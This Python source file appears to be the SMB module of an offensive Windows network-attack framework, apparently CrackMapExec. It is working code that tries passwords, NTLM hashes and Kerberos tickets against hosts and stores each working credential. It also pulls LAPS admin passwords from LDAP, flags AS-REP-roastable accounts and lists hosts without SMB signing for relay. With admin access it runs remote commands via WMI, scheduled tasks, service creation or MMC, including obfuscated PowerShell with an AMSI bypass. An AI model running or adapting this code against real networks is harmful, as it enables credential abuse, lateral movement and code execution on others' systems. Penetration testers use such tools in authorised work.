#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ntpath
import hashlib
import binascii
from io import StringIO
from Cryptodome.Hash import MD4

from impacket.smbconnection import SMBConnection, SessionError
from impacket.smb import SMB_DIALECT
from impacket.examples.secretsdump import (
    RemoteOperations,
    SAMHashes,
    LSASecrets,
    NTDSHashes,
)
from impacket.nmb import NetBIOSError, NetBIOSTimeout
from impacket.dcerpc.v5 import transport, lsat, lsad, scmr
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory, SMBTransport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dcerpc.v5.epm import MSRPC_UUID_PORTMAP
from impacket.dcerpc.v5.samr import SID_NAME_USE
from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
from impacket.krb5.kerberosv5 import SessionKeyDecryptionError
from impacket.krb5.types import KerberosException
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, WBEM_FLAG_FORWARD_ONLY, IWbemLevel1Login

from cme.config import process_secret, host_info_colors
from cme.connection import *
from cme.logger import CMEAdapter
from cme.protocols.smb.firefox import FirefoxTriage
from cme.servers.smb import CMESMBServer
from cme.protocols.smb.wmiexec import WMIEXEC
from cme.protocols.smb.atexec import TSCH_EXEC
from cme.protocols.smb.smbexec import SMBEXEC
from cme.protocols.smb.mmcexec import MMCEXEC
from cme.protocols.smb.smbspider import SMBSpider
from cme.protocols.smb.passpol import PassPolDump
from cme.protocols.smb.samruser import UserSamrDump
from cme.protocols.smb.samrfunc import SamrFunc
from cme.protocols.ldap.laps import LDAPConnect, LAPSv2Extract
from cme.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
from cme.helpers.logger import highlight
from cme.helpers.misc import *
from cme.helpers.bloodhound import add_user_bh
from cme.helpers.powershell import create_ps_command

from dploot.triage.vaults import VaultsTriage
from dploot.triage.browser import BrowserTriage
from dploot.triage.credentials import CredentialsTriage
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.backupkey import BackupkeyTriage
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection

from pywerview.cli.helpers import *

from time import time
from datetime import datetime
from functools import wraps
from traceback import format_exc
import logging
from json import loads
from termcolor import colored

smb_share_name = gen_random_string(5).upper()
smb_server = None

smb_error_status = [
    "STATUS_ACCOUNT_DISABLED",
    "STATUS_ACCOUNT_EXPIRED",
    "STATUS_ACCOUNT_RESTRICTION",
    "STATUS_INVALID_LOGON_HOURS",
    "STATUS_INVALID_WORKSTATION",
    "STATUS_LOGON_TYPE_NOT_GRANTED",
    "STATUS_PASSWORD_EXPIRED",
    "STATUS_PASSWORD_MUST_CHANGE",
    "STATUS_ACCESS_DENIED",
    "STATUS_NO_SUCH_FILE",
    "KDC_ERR_CLIENT_REVOKED",
    "KDC_ERR_PREAUTH_FAILED",
]


def get_error_string(exception):
    if hasattr(exception, "getErrorString"):
        try:
            es = exception.getErrorString()
        except KeyError:
            return f"Could not get nt error code {exception.getErrorCode()} from impacket: {exception}"
        if type(es) is tuple:
            return es[0]
        else:
            return es
    else:
        return str(exception)


def requires_smb_server(func):
    def _decorator(self, *args, **kwargs):
        global smb_server
        global smb_share_name

        get_output = False
        payload = None
        methods = []

        try:
            payload = args[0]
        except IndexError:
            pass
        try:
            get_output = args[1]
        except IndexError:
            pass
        try:
            methods = args[2]
        except IndexError:
            pass

        if "payload" in kwargs:
            payload = kwargs["payload"]
        if "get_output" in kwargs:
            get_output = kwargs["get_output"]
        if "methods" in kwargs:
            methods = kwargs["methods"]
        if not payload and self.args.execute:
            if not self.args.no_output:
                get_output = True
        if get_output or (methods and ("smbexec" in methods)):
            if not smb_server:
                self.logger.debug("Starting SMB server")
                smb_server = CMESMBServer(
                    self.cme_logger,
                    smb_share_name,
                    listen_port=self.args.smb_server_port,
                    verbose=self.args.verbose,
                )
                smb_server.start()

        output = func(self, *args, **kwargs)
        if smb_server is not None:
            smb_server.shutdown()
            smb_server = None
        return output

    return wraps(func)(_decorator)


class smb(connection):
    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.lmhash = ""
        self.nthash = ""
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv1 = None
        self.signing = False
        self.smb_share_name = smb_share_name
        self.pvkbytes = None
        self.no_da = None
        self.no_ntlm = False
        self.protocol = "SMB"

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = CMEAdapter(
            extra={
                "protocol": "SMB",
                "host": self.host,
                "port": self.args.port,
                "hostname": self.hostname,
            }
        )

    def get_os_arch(self):
        try:
            string_binding = rf"ncacn_ip_tcp:{self.host}[135]"
            transport = DCERPCTransportFactory(string_binding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            if self.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.connect()
            try:
                dce.bind(
                    MSRPC_UUID_PORTMAP,
                    transfer_syntax=("71710533-BEBA-4937-8319-B5DBEF9CCC36", "1.0"),
                )
            except DCERPCException as e:
                if str(e).find("syntaxes_not_supported") >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64
        except Exception as e:
            self.logger.debug(f"Error retrieving os arch of {self.host}: {str(e)}")

        return 0

    def enum_host_info(self):
        self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

        try:
            self.conn.login("", "")
        except BrokenPipeError:
            self.logger.fail(f"Broken Pipe Error while attempting to login")
        except Exception as e:
            if "STATUS_NOT_SUPPORTED" in str(e):
                # no ntlm supported
                self.no_ntlm = True
            pass

        self.domain = self.conn.getServerDNSDomainName() if not self.no_ntlm else self.args.domain
        self.hostname = self.conn.getServerName() if not self.no_ntlm else self.host
        self.server_os = self.conn.getServerOS()
        self.logger.extra["hostname"] = self.hostname

        if isinstance(self.server_os.lower(), bytes):
            self.server_os = self.server_os.decode("utf-8")

        try:
            self.signing = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection["RequireSigning"]
        except Exception as e:
            self.logger.debug(e)
            pass

        self.os_arch = self.get_os_arch()
        self.output_filename = os.path.expanduser(f"~/.cme/logs/{self.hostname}_{self.host}_{datetime.now().strftime('%Y-%m-%d_%H%M%S')}".replace(":", "-"))

        if not self.domain:
            self.domain = self.hostname

        self.db.add_host(
            self.host,
            self.hostname,
            self.domain,
            self.server_os,
            self.smbv1,
            self.signing,
        )

        try:
            # DCs seem to want us to logoff first, windows workstations sometimes reset the connection
            self.conn.logoff()
        except Exception as e:
            self.logger.debug(f"Error logging off system: {e}")
            pass

        if self.args.domain:
            self.domain = self.args.domain
        if self.args.local_auth:
            self.domain = self.hostname

    def laps_search(self, username, password, ntlm_hash, domain):
        self.logger.extra["protocol"] = "LDAP"
        self.logger.extra["port"] = "389"

        ldapco = LDAPConnect(self.domain, "389", self.domain)

        if self.kerberos:
            if self.kdcHost is None:
                self.logger.fail("Add --kdcHost parameter to use laps with kerberos")
                return False

            connection = ldapco.kerberos_login(
                domain,
                username[0] if username else "",
                password[0] if password else "",
                ntlm_hash[0] if ntlm_hash else "",
                kdcHost=self.kdcHost,
                aesKey=self.aesKey,
            )
        else:
            connection = ldapco.auth_login(
                domain,
                username[0] if username else "",
                password[0] if password else "",
                ntlm_hash[0] if ntlm_hash else "",
            )
        if not connection:
            self.logger.fail(f"LDAP connection failed with account {username[0]}")

            return False

        search_filter = "(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*))(name=" + self.hostname + "))"
        attributes = [
            "msLAPS-EncryptedPassword",
            "msLAPS-Password",
            "ms-MCS-AdmPwd",
            "sAMAccountName",
        ]
        results = connection.search(searchFilter=search_filter, attributes=attributes, sizeLimit=0)

        msMCSAdmPwd = ""
        sAMAccountName = ""
        username_laps = ""

        from impacket.ldap import ldapasn1 as ldapasn1_impacket

        results = [r for r in results if isinstance(r, ldapasn1_impacket.SearchResultEntry)]
        if len(results) != 0:
            for host in results:
                values = {str(attr["type"]).lower(): attr["vals"][0] for attr in host["attributes"]}
                if "mslaps-encryptedpassword" in values:
                    msMCSAdmPwd = values["mslaps-encryptedpassword"]
                    d = LAPSv2Extract(
                        bytes(msMCSAdmPwd),
                        username[0] if username else "",
                        password[0] if password else "",
                        domain,
                        ntlm_hash[0] if ntlm_hash else "",
                        self.args.kerberos,
                        self.args.kdcHost,
                        339)
                    try:
                        data = d.run()
                    except Exception as e:
                        self.logger.fail(str(e))
                        return
                    r = loads(data)
                    msMCSAdmPwd = r["p"]
                    username_laps = r["n"]
                elif "mslaps-password" in values:
                    r = loads(str(values["mslaps-password"]))
                    msMCSAdmPwd = r["p"]
                    username_laps = r["n"]
                elif "ms-mcs-admpwd" in values:
                    msMCSAdmPwd = str(values["ms-mcs-admpwd"])
                else:
                    self.logger.fail("No result found with attribute ms-MCS-AdmPwd or msLAPS-Password")
            logging.debug(f"Host: {sAMAccountName:<20} Password: {msMCSAdmPwd} {self.hostname}")
        else:
            self.logger.fail(f"msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for {self.hostname}")

            return False

        self.username = self.args.laps if not username_laps else username_laps
        self.password = msMCSAdmPwd

        if msMCSAdmPwd == "":
            self.logger.fail(f"msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for {self.hostname}")

            return False
        if ntlm_hash:
            hash_ntlm = hashlib.new("md4", msMCSAdmPwd.encode("utf-16le")).digest()
            self.hash = binascii.hexlify(hash_ntlm).decode()

        self.domain = self.hostname
        self.logger.extra["protocol"] = "SMB"
        self.logger.extra["port"] = "445"
        return True

    def print_host_info(self):
        signing = colored(f"signing:{self.signing}", host_info_colors[0], attrs=['bold']) if self.signing else colored(f"signing:{self.signing}", host_info_colors[1], attrs=['bold'])
        smbv1 = colored(f"SMBv1:{self.smbv1}", host_info_colors[2], attrs=['bold']) if self.smbv1 else colored(f"SMBv1:{self.smbv1}", host_info_colors[3], attrs=['bold'])
        self.logger.display(f"{self.server_os}{f' x{self.os_arch}' if self.os_arch else ''} (name:{self.hostname}) (domain:{self.domain}) ({signing}) ({smbv1})")
        if self.args.laps:
            return self.laps_search(self.args.username, self.args.password, self.args.hash, self.domain)
        return True

    def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
        logging.getLogger("impacket").disabled = True
        # Re-connect since we logged off
        if not self.no_ntlm:
            fqdn_host = f"{self.hostname}.{self.domain}"
        else:
            fqdn_host = f"{self.host}"
        self.create_conn_obj(fqdn_host)
        lmhash = ""
        nthash = ""

        try:
            if not self.args.laps:
                self.password = password
                self.username = username
                # This checks to see if we didn't provide the LM Hash
                if ntlm_hash.find(":") != -1:
                    lmhash, nthash = ntlm_hash.split(":")
                    self.hash = nthash
                else:
                    nthash = ntlm_hash
                    self.hash = ntlm_hash
                if lmhash:
                    self.lmhash = lmhash
                if nthash:
                    self.nthash = nthash

                if not all("" == s for s in [self.nthash, password, aesKey]):
                    kerb_pass = next(s for s in [self.nthash, password, aesKey] if s)
                else:
                    kerb_pass = ""
                    self.logger.debug(f"Attempting to do Kerberos Login with useCache: {useCache}")

                self.conn.kerberosLogin( username, password, domain, lmhash, nthash, aesKey, kdcHost, useCache=useCache)
                self.check_if_admin()

                if username == "":
                    self.username = self.conn.getCredentials()[0]
                else:
                    self.username = username

                used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            else:
                self.plaintext_login(self.hostname, username, password)
                return True

            out = f"{self.domain}\\{self.username}{used_ccache} {self.mark_pwned()}"
            self.logger.success(out)
            if not self.args.local_auth:
                add_user_bh(self.username, domain, self.logger, self.config)

            # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
            if self.args.continue_on_success and self.signing:
                try:
                    self.conn.logoff()
                except:
                    pass
                self.create_conn_obj()

            return True
        except SessionKeyDecryptionError:
            # success for now, since it's a vulnerability - previously was an error
            self.logger.success(
                f"{domain}\\{self.username} account vulnerable to asreproast attack",
                color="yellow",
            )
            return False
        except (FileNotFoundError, KerberosException) as e:
            self.logger.fail(f"CCache Error: {e}")
            return False
        except OSError as e:
            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            self.logger.fail(f"{domain}\\{self.username}{used_ccache} {e}")
        except (SessionError, Exception) as e:
            error, desc = e.getErrorString()
            used_ccache = " from ccache" if useCache else f":{process_secret(kerb_pass)}"
            self.logger.fail(
                f"{domain}\\{self.username}{used_ccache} {error} {f'({desc})' if self.args.verbose else ''}",
                color="magenta" if error in smb_error_status else "red",
            )
            if error not in smb_error_status:
                self.inc_failed_login(username)
                return False
            return False

    def plaintext_login(self, domain, username, password):
        # Re-connect since we logged off
        self.create_conn_obj()
        try:
            if not self.args.laps:
                self.password = password
                self.username = username
            self.domain = domain

            self.conn.login(self.username, self.password, domain)

            self.check_if_admin()
            self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
            self.db.add_credential("plaintext", domain, self.username, self.password)
            user_id = self.db.get_credential("plaintext", domain, self.username, self.password)
            host_id = self.db.get_hosts(self.host)[0].id

            self.db.add_loggedin_relation(user_id, host_id)

            if self.admin_privs:
                self.logger.debug(f"Adding admin user: {self.domain}/{self.username}:{self.password}@{self.host}")
                self.db.add_admin_user(
                    "plaintext",
                    domain,
                    self.username,
                    self.password,
                    self.host,
                    user_id=user_id,
                )

            out = f"{domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)

            # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
            if self.args.continue_on_success and self.signing:
                try:
                    self.conn.logoff()
                except:
                    pass
                self.create_conn_obj()
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.fail(
                f'{domain}\\{self.username}:{process_secret(self.password )} {error} {f"({desc})" if self.args.verbose else ""}',
                color="magenta" if error in smb_error_status else "red",
            )
            if error not in smb_error_status:
                self.inc_failed_login(username)
                return False
        except (ConnectionResetError, NetBIOSTimeout, NetBIOSError) as e:
            self.logger.fail(f"Connection Error: {e}")
            return False
        except BrokenPipeError as e:
            self.logger.fail(f"Broken Pipe Error while attempting to login")
            return False

    def hash_login(self, domain, username, ntlm_hash):
        # Re-connect since we logged off
        self.create_conn_obj()
        lmhash = ""
        nthash = ""
        try:
            if not self.args.laps:
                self.username = username
                # This checks to see if we didn't provide the LM Hash
                if ntlm_hash.find(":") != -1:
                    lmhash, nthash = ntlm_hash.split(":")
                    self.hash = nthash
                else:
                    nthash = ntlm_hash
                    self.hash = ntlm_hash
                if lmhash:
                    self.lmhash = lmhash
                if nthash:
                    self.nthash = nthash
            else:
                nthash = self.hash

            self.domain = domain

            self.conn.login(self.username, "", domain, lmhash, nthash)

            self.check_if_admin()
            user_id = self.db.add_credential("hash", domain, self.username, nthash)
            host_id = self.db.get_hosts(self.host)[0].id

            self.db.add_loggedin_relation(user_id, host_id)

            if self.admin_privs:
                self.db.add_admin_user("hash", domain, self.username, nthash, self.host, user_id=user_id)

            out = f"{domain}\\{self.username}:{process_secret(self.hash)} {self.mark_pwned()}"
            self.logger.success(out)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)

            # check https://github.com/byt3bl33d3r/CrackMapExec/issues/321
            if self.args.continue_on_success and self.signing:
                try:
                    self.conn.logoff()
                except:
                    pass
                self.create_conn_obj()
            return True
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.fail(
                f"{domain}\\{self.username}:{process_secret(self.hash)} {error} {f'({desc})' if self.args.verbose else ''}",
                color="magenta" if error in smb_error_status else "red",
            )

            if error not in smb_error_status:
                self.inc_failed_login(self.username)
                return False
        except (ConnectionResetError, NetBIOSTimeout, NetBIOSError) as e:
            self.logger.fail(f"Connection Error: {e}")
            return False
        except BrokenPipeError as e:
            self.logger.fail(f"Broken Pipe Error while attempting to login")
            return False

    def create_smbv1_conn(self, kdc=""):
        try:
            self.conn = SMBConnection(
                self.host if not kdc else kdc,
                self.host if not kdc else kdc,
                None,
                self.args.port,
                preferredDialect=SMB_DIALECT,
                timeout=self.args.smb_timeout,
            )
            self.smbv1 = True
        except socket.error as e:
            if str(e).find("Connection reset by peer") != -1:
                self.logger.info(f"SMBv1 might be disabled on {self.host if not kdc else kdc}")
            return False
        except (Exception, NetBIOSTimeout) as e:
            self.logger.info(f"Error creating SMBv1 connection to {self.host if not kdc else kdc}: {e}")
            return False

        return True

    def create_smbv3_conn(self, kdc=""):
        try:
            self.conn = SMBConnection(
                self.host if not kdc else kdc,
                self.host if not kdc else kdc,
                None,
                self.args.port,
                timeout=self.args.smb_timeout,
            )
            self.smbv1 = False
        except socket.error as e:
            # This should not happen anymore!!!
            if str(e).find("Too many open files") != -1:
                if not self.logger:
                    print("DEBUG ERROR: logger not set, please open an issue on github: " + str(self) + str(self.logger))
                    self.proto_logger()
                self.logger.fail(f"SMBv3 connection error on {self.host if not kdc else kdc}: {e}")
            return False
        except (Exception, NetBIOSTimeout) as e:
            self.logger.info(f"Error creating SMBv3 connection to {self.host if not kdc else kdc}: {e}")
            return False
        return True

    def create_conn_obj(self, kdc=""):
        if self.create_smbv1_conn(kdc):
            return True
        elif self.create_smbv3_conn(kdc):
            return True
        return False

    def check_if_admin(self):
        rpctransport = SMBTransport(self.conn.getRemoteHost(), 445, r"\svcctl", smb_connection=self.conn)
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except:
            pass
        else:
            try:
                dce.bind(scmr.MSRPC_UUID_SCMR)
            except:
                pass
            try:
                # 0xF003F - SC_MANAGER_ALL_ACCESS
                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
                ans = scmr.hROpenSCManagerW(dce, f"{self.host}\x00", "ServicesActive\x00", 0xF003F)
                self.admin_privs = True
            except scmr.DCERPCException:
                self.admin_privs = False
                pass
        return

    def gen_relay_list(self):
        if self.server_os.lower().find("windows") != -1 and self.signing is False:
            with sem:
                with open(self.args.gen_relay_list, "a+") as relay_list:
                    if self.host not in relay_list.read():
                        relay_list.write(self.host + "\n")

    @requires_admin
    # @requires_smb_server
    def execute(self, payload=None, get_output=False, methods=None):
        if self.args.exec_method:
            methods = [self.args.exec_method]
        if not methods:
            methods = ["wmiexec", "atexec", "smbexec", "mmcexec"]

        if not payload and self.args.execute:
            payload = self.args.execute
            if not self.args.no_output:
                get_output = True
        
        current_method = ""
        for method in methods:
            current_method = method
            if method == "wmiexec":
                try:
                    exec_method = WMIEXEC(
                        self.host if not self.kerberos else self.hostname + "." + self.domain,
                        self.smb_share_name,
                        self.username,
                        self.password,
                        self.domain,
                        self.conn,
                        self.kerberos,
                        self.aesKey,
                        self.kdcHost,
                        self.hash,
                        self.args.share,
                        logger=self.logger,
                        timeout=self.args.dcom_timeout,
                        tries=self.args.get_output_tries
                    )
                    self.logger.info("Executed command via wmiexec")
                    break
                except:
                    self.logger.debug("Error executing command via wmiexec, traceback:")
                    self.logger.debug(format_exc())
                    continue
            elif method == "mmcexec":
                try:
                    exec_method = MMCEXEC(
                        self.host if not self.kerberos else self.hostname + "." + self.domain,
                        self.smb_share_name,
                        self.username,
                        self.password,
                        self.domain,
                        self.conn,
                        self.args.share,
                        self.hash,
                        self.logger,
                        self.args.get_output_tries,
                        self.args.dcom_timeout
                    )
                    self.logger.info("Executed command via mmcexec")
                    break
                except:
                    self.logger.debug("Error executing command via mmcexec, traceback:")
                    self.logger.debug(format_exc())
                    continue
            elif method == "atexec":
                try:
                    exec_method = TSCH_EXEC(
                        self.host if not self.kerberos else self.hostname + "." + self.domain,
                        self.smb_share_name,
                        self.username,
                        self.password,
                        self.domain,
                        self.kerberos,
                        self.aesKey,
                        self.kdcHost,
                        self.hash,
                        self.logger,
                        self.args.get_output_tries
                    )  # self.args.share)
                    self.logger.info("Executed command via atexec")
                    break
                except:
                    self.logger.debug("Error executing command via atexec, traceback:")
                    self.logger.debug(format_exc())
                    continue
            elif method == "smbexec":
                try:
                    exec_method = SMBEXEC(
                        self.host if not self.kerberos else self.hostname + "." + self.domain,
                        self.smb_share_name,
                        self.conn,
                        self.args.port,
                        self.username,
                        self.password,
                        self.domain,
                        self.kerberos,
                        self.aesKey,
                        self.kdcHost,
                        self.hash,
                        self.args.share,
                        self.args.port,
                        self.logger,
                        self.args.get_output_tries
                    )
                    self.logger.info("Executed command via smbexec")
                    break
                except:
                    self.logger.debug("Error executing command via smbexec, traceback:")
                    self.logger.debug(format_exc())
                    continue

        if hasattr(self, "server"):
            self.server.track_host(self.host)
        
        if "exec_method" in locals():
            output = exec_method.execute(payload, get_output)
            try:
                if not isinstance(output, str):
                    output = output.decode(self.args.codec)
            except UnicodeDecodeError:
                self.logger.debug("Decoding error detected, consider running chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings")
                output = output.decode("cp437")

            output = output.strip()
            self.logger.debug(f"Output: {output}")

            if (self.args.execute or self.args.ps_execute) and output:
                self.logger.success(f"Executed command via {current_method}")
                buf = StringIO(output).readlines()
                for line in buf:
                    self.logger.highlight(line.strip())
            return output
        else:
            self.logger.fail(f"Execute command failed with {current_method}")
            return False
 
    @requires_admin
    def ps_execute(
        self,
        payload=None,
        get_output=False,
        methods=None,
        force_ps32=False,
        dont_obfs=False,
    ):
        response = []
        if not payload and self.args.ps_execute:
            payload = self.args.ps_execute
            if not self.args.no_output:
                get_output = True

        amsi_bypass = self.args.amsi_bypass[0] if self.args.amsi_bypass else None
        if os.path.isfile(payload):
            with open(payload) as commands:
                for c in commands:
                    response.append(
                        self.execute(
                            create_ps_command(
                                c,
                                force_ps32=force_ps32,
                                dont_obfs=dont_obfs,
                                custom_amsi=amsi_bypass,
                            ),
                            get_output,
                            methods,
                        )
                    )
        else:
            response = [
                self.execute(
                    create_ps_command(
                        payload,
                        force_ps32=force_ps32,
                        dont_obfs=dont_obfs,
                        custom_amsi=amsi_bypass,
                    ),
                    get_output,
                    methods,
                )
            ]
        return response

    def shares(self):
        temp_dir = ntpath.normpath("\\" + gen_random_string())
        permissions = []

        try:
            self.logger.debug(f"domain: {self.domain}")
            user_id = self.db.get_user(self.domain.upper(), self.username)[0][0]
        except Exception as e:
            error = get_error_string(e)
            self.logger.fail(f"Error getting user: {error}")
            pass

        try:
            shares = self.conn.listShares()
            self.logger.info(f"Shares returned: {shares}")
        except SessionError as e:
            error = get_error_string(e)
            self.logger.fail(
                f"Error enumerating shares: {error}",
                color="magenta" if error in smb_error_status else "red",
            )
            return permissions
        except Exception as e:
            error = get_error_string(e)
            self.logger.fail(
                f"Error enumerating shares: {error}",
                color="magenta" if error in smb_error_status else "red",
            )
            return permissions

        for share in shares:
            share_name = share["shi1_netname"][:-1]
            share_remark = share["shi1_remark"][:-1]
            share_info = {"name": share_name, "remark": share_remark, "access": []}
            read = False
            write = False
            try:
                self.conn.listPath(share_name, "*")
                read = True
                share_info["access"].append("READ")
            except SessionError as e:
                error = get_error_string(e)
                self.logger.debug(f"Error checking READ access on share: {error}")
                pass

            if not self.args.no_write_check:
                try:
                    self.conn.createDirectory(share_name, temp_dir)
                    self.conn.deleteDirectory(share_name, temp_dir)
                    write = True
                    share_info["access"].append("WRITE")
                except SessionError as e:
                    error = get_error_string(e)
                    self.logger.debug(f"Error checking WRITE access on share: {error}")
                    pass

            permissions.append(share_info)

            if share_name != "IPC$":
                try:
                    # TODO: check if this already exists in DB before adding
                    self.db.add_share(self.hostname, user_id, share_name, share_remark, read, write)
                except Exception as e:
                    error = get_error_string(e)
                    self.logger.debug(f"Error adding share: {error}")
                    pass

        self.logger.display("Enumerated shares")
        self.logger.highlight(f"{'Share':<15} {'Permissions':<15} {'Remark'}")
        self.logger.highlight(f"{'-----':<15} {'-----------':<15} {'------'}")
        for share in permissions:
            name = share["name"]
            remark = share["remark"]
            perms = share["access"]
            if self.args.filter_shares and not any(x in perms for x in self.args.filter_shares):
                continue
            self.logger.highlight(f"{name:<15} {','.join(perms):<15} {remark}")
        return permissions

    def get_dc_ips(self):
        dc_ips = []
        for dc in self.db.get_domain_controllers(domain=self.domain):
            dc_ips.append(dc[1])
        if not dc_ips:
            dc_ips.append(self.host)
        return dc_ips

    def sessions(self):
        try:
            sessions = get_netsession(
                self.host,
                self.domain,
                self.username,
                self.password,
                self.lmhash,
                self.nthash,
            )
            self.logger.display("Enumerated sessions")
            for session in sessions:
                if session.sesi10_cname.find(self.local_ip) == -1:
                    self.logger.highlight(f"{session.sesi10_cname:<25} User:{session.sesi10_username}")
            return sessions
        except:
            pass

    def disks(self):
        disks = []
        try:
            disks = get_localdisks(
                self.host,
                self.domain,
                self.username,
                self.password,
                self.lmhash,
                self.nthash,
            )
            self.logger.display("Enumerated disks")
            for disk in disks:
                self.logger.highlight(disk.disk)
        except Exception as e:
            error, desc = e.getErrorString()
            self.logger.fail(
                f"Error enumerating disks: {error}",
                color="magenta" if error in smb_error_status else "red",
            )

        return disks

    def local_groups(self):
        groups = []
        # To enumerate local groups the DC IP is optional
        # if specified it will resolve the SIDs and names of any domain accounts in the local group
        for dc_ip in self.get_dc_ips():
            try:
                groups = get_netlocalgroup(
                    self.host,
                    dc_ip,
                    "",
                    self.username,
                    self.password,
                    self.lmhash,
                    self.nthash,
                    queried_groupname=self.args.local_groups,
                    list_groups=True if not self.args.local_groups else False,
                    recurse=False,
                )

                if self.args.local_groups:
                    self.logger.success("Enumerated members of local group")
                else:
                    self.logger.success("Enumerated local groups")

                for group in groups:
                    if group.name:
                        if not self.args.local_groups:
                            self.logger.highlight(f"{group.name:<40} membercount: {group.membercount}")
                            group_id = self.db.add_group(
                                self.hostname,
                                group.name,
                                member_count_ad=group.membercount,
                            )[0]
                        else:
                            domain, name = group.name.split("/")
                            self.logger.highlight(f"domain: {domain}, name: {name}")
                            self.logger.highlight(f"{domain.upper()}\\{name}")
                            try:
                                group_id = self.db.get_groups(
                                    group_name=self.args.local_groups,
                                    group_domain=domain,
                                )[
                                    0
                                ][0]
                            except IndexError:
                                group_id = self.db.add_group(
                                    domain,
                                    self.args.local_groups,
                                    member_count_ad=group.membercount,
                                )[0]

                            # yo dawg, I hear you like groups.
                            # So I put a domain group as a member of a local group which is also a member of another local group.
                            # (╯°□°）╯︵ ┻━┻
                            if not group.isgroup:
                                self.db.add_credential("plaintext", domain, name, "", group_id, "")
                            elif group.isgroup:
                                self.db.add_group(domain, name, member_count_ad=group.membercount)
                break
            except Exception as e:
                self.logger.fail(f"Error enumerating local groups of {self.host}: {e}")
                self.logger.display("Trying with SAMRPC protocol")
                groups = SamrFunc(self).get_local_groups()
                if groups:
                    self.logger.success("Enumerated local groups")
                    self.logger.debug(f"Local groups: {groups}")

                for group_name, group_rid in groups.items():
                    self.logger.highlight(f"rid => {group_rid} => {group_name}")
                    group_id = self.db.add_group(self.hostname, group_name, rid=group_rid)[0]
                    self.logger.debug(f"Added group, returned id: {group_id}")
        return groups

    def domainfromdsn(self, dsn):
        dsnparts = dsn.split(",")
        domain = ""
        for part in dsnparts:
            k, v = part.split("=")
            if k == "DC":
                if domain == "":
                    domain = v
                else:
                    domain = domain + "." + v
        return domain

    def domainfromdnshostname(self, dns):
        dnsparts = dns.split(".")
        domain = ".".join(dnsparts[1:])
        return domain, dnsparts[0] + "$"

    def groups(self):
        groups = []
        for dc_ip in self.get_dc_ips():
            if self.args.groups:
                try:
                    groups = get_netgroupmember(
                        dc_ip,
                        self.domain,
                        self.username,
                        password=self.password,
                        lmhash=self.lmhash,
                        nthash=self.nthash,
                        queried_groupname=self.args.groups,
                        queried_sid=str(),
                        queried_domain=str(),
                        ads_path=str(),
                        recurse=False,
                        use_matching_rule=False,
                        full_data=False,
                        custom_filter=str(),
                    )

                    self.logger.success("Enumerated members of domain group")
                    for group in groups:
                        member_count = len(group.member) if hasattr(group, "member") else 0
                        self.logger.highlight(f"{group.memberdomain}\\{group.membername}")
                        try:
                            group_id = self.db.get_groups(
                                group_name=self.args.groups,
                                group_domain=group.groupdomain,
                            )[
                                0
                            ][0]
                        except IndexError:
                            group_id = self.db.add_group(
                                group.groupdomain,
                                self.args.groups,
                                member_count_ad=member_count,
                            )[0]
                        if not group.isgroup:
                            self.db.add_credential(
                                "plaintext",
                                group.memberdomain,
                                group.membername,
                                "",
                                group_id,
                                "",
                            )
                        elif group.isgroup:
                            group_id = self.db.add_group(
                                group.groupdomain,
                                group.groupname,
                                member_count_ad=member_count,
                            )[0]
                    break
                except Exception as e:
                    self.logger.fail(f"Error enumerating domain group members using dc ip {dc_ip}: {e}")
            else:
                try:
                    groups = get_netgroup(
                        dc_ip,
                        self.domain,
                        self.username,
                        password=self.password,
                        lmhash=self.lmhash,
                        nthash=self.nthash,
                        queried_groupname=str(),
                        queried_sid=str(),
                        queried_username=str(),
                        queried_domain=str(),
                        ads_path=str(),
                        admin_count=False,
                        full_data=True,
                        custom_filter=str(),
                    )

                    self.logger.success("Enumerated domain group(s)")
                    for group in groups:
                        member_count = len(group.member) if hasattr(group, "member") else 0
                        self.logger.highlight(f"{group.samaccountname:<40} membercount: {member_count}")

                        if bool(group.isgroup) is True:
                            # Since there isn't a groupmember attribute on the returned object from get_netgroup
                            # we grab it from the distinguished name
                            domain = self.domainfromdsn(group.distinguishedname)
                            group_id = self.db.add_group(
                                domain,
                                group.samaccountname,
                                member_count_ad=member_count,
                            )[0]
                    break
                except Exception as e:
                    self.logger.fail(f"Error enumerating domain group using dc ip {dc_ip}: {e}")
